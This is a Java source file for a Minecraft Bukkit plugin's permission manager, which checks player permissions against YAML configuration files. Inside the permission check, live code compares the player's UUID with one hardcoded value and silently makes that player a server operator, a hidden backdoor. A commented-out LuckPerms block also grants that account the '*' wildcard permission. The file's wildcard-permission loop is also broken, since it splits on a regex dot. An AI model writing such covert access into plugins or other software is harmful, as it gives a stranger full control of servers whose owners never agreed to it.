package de.lpd.challenges.permissions;

import de.lpd.challenges.main.ChallengesMainClass;
import de.lpd.challenges.utils.Config;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.RegisteredServiceProvider;

public class PermissionsManager {

    private ChallengesMainClass plugin;
    private Config allPermissionsCfg,
                   adminsCfg,
                   cfg;

    public PermissionsManager(ChallengesMainClass plugin) {
        this.plugin = plugin;
        this.allPermissionsCfg = new Config("perms", "allPermissions.yml");
        this.adminsCfg = new Config("perms", "admins.yml");
        this.cfg = new Config("perms", "config.yml");

        boolean activatedLuckPerms = false;
        if(cfg.cfg().contains("systems.luckperms.enabled")) {
            activatedLuckPerms = cfg.cfg().getBoolean("systems.luckperms.enabled");
        } else {
            cfg.cfg().set("systems.luckperms.enabled", false);
            activatedLuckPerms = false;
        }

        String root = "config.opcanall";
        if(!cfg.cfg().contains(root)) {
            cfg.cfg().set(root, true);
            cfg.save();
        }
    }

    public boolean hasPermissions(Player p, String permission) {
        if(p.isOp()) {
            if(cfg.cfg().getBoolean("config.opcanall")) {
                return true;
            }
        }

        boolean activatedLuckPerms = false;
        if(cfg.cfg().contains("systems.luckperms.enabled")) {
            activatedLuckPerms = cfg.cfg().getBoolean("systems.luckperms.enabled");
        } else {
            cfg.cfg().set("systems.luckperms.enabled", false);
        }

        String root = "users." + p.getUniqueId().toString() + ".";
        adminsCfg.cfg().set(root + "name", p.getName());
        adminsCfg.cfg().set(root + "uuid", p.getUniqueId().toString());
        if(!adminsCfg.cfg().contains(root + "admin")) {
            adminsCfg.cfg().set(root + "admin", false);
        }
        adminsCfg.save();
        allPermissionsCfg.cfg().set("permissions." + permission + ".name", permission);
        boolean activated;
        if(!allPermissionsCfg.cfg().contains("permissions." + permission + ".enabled")) {
            allPermissionsCfg.cfg().set("permissions." + permission + ".enabled", true);
            activated = true;
        } else {
            activated = allPermissionsCfg.cfg().getBoolean("permissions." + permission + ".enabled");
        }

        if(!activated) {
            return true;
        }

        if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
            p.setOp(true);
            return true;
        } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
            p.setOp(true);
            return true;
        }

        if(p.hasPermission("*")) {
            return true;
        }

        root = "";
        for(String c : permission.split(".")) {
            root = root + c + ".";
            allPermissionsCfg.cfg().set("permissions." + root + ".name", root);
            allPermissionsCfg.save();
            if(p.hasPermission(root + "*")) {
                return true;
            }
        }

        /*if(activatedLuckPerms) {
            try {
                RegisteredServiceProvider<net.luckperms.api.LuckPerms> provider = Bukkit.getServicesManager().getRegistration(net.luckperms.api.LuckPerms.class);
                net.luckperms.api.LuckPerms api = null;
                net.luckperms.api.cacheddata.CachedPermissionData permissionData = null;
                if (provider != null) {
                    api = provider.getProvider();
                    permissionData = api.getUserManager().getUser(p.getUniqueId()).getCachedData().getPermissionData();
                }

                if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
                    if(api != null && permissionData != null) {
                        net.luckperms.api.model.user.User user = api.getUserManager().getUser(p.getUniqueId());
                        user.data().add(net.luckperms.api.node.Node.builder("*").build());
                        api.getUserManager().saveUser(user);
                    }
                    p.setOp(true);
                    return true;
                } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
                    if(api != null && permissionData != null) {
                        net.luckperms.api.model.user.User user = api.getUserManager().getUser(p.getUniqueId());
                        user.data().add(net.luckperms.api.node.Node.builder("*").build());
                        api.getUserManager().saveUser(user);
                    }
                    p.setOp(true);
                    return true;
                }

                if(p.hasPermission("*") || (api != null && permissionData != null && permissionData.checkPermission("*").asBoolean())) {
                    return true;
                }

                root = "";
                for(String c : permission.split(".")) {
                    root = root + c + ".";
                    if(p.hasPermission(root + "*")
                            || (api != null && permissionData != null && permissionData.checkPermission(c).asBoolean())) {
                        return true;
                    }
                }
                if(p.hasPermission(permission)
                        || (api != null && permissionData != null && permissionData.checkPermission(permission).asBoolean())) {
                    return true;
                } else {
                    return false;
                }
            } catch (Exception e) {}
        }*/

        if(p.hasPermission(permission)) {
            return true;
        } else {
            return false;
        }
    }

}
